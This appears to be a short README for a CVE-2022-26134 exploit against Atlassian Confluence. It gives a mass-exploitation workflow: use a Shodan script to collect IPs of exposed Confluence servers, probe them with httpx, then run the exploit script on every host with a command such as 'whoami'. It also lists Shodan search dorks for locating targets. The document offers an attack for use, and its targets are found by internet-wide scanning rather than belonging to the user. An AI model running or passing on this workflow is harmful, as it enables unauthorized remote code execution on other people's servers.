# CVE-2022-26134

1) First run the shodan scripts to grabs all the ips <br><br>
   `python3 shodan_script.py -API your_api -L limit -D "http.favicon.hash:-305179312 200" > log.txt`
   <br>   
   `ex: python3 shodan_script.py -API xxxxxxx -L 10 -D "http.favicon.hash:-305179312 200" > log.txt`

2) For all valid ips : <br><br>
   `cat log.txt | httpx -o forexploits.txt`
   
3) Run Exploit against the list "forexploits.txt" : <br><br>
   `python3 CVE-2022-26134.py forexploits.txt "whoami"` <br><br>
    which prints the ip and command for vulnerable hosts.

# Shodan_Dorks for CVE-2022-26134
`http.component:"atlassian confluence"`<br> <br>
`http.favicon.hash:-305179312"`<br> <br>
`http.title:"Log In - Confluence" 200`<br> <br>
`http.component:"atlassian confluence" http.title:"Log In - Confluence" 200`<br> <br>
`http.favicon.hash:-305179312 200`<br> <br>
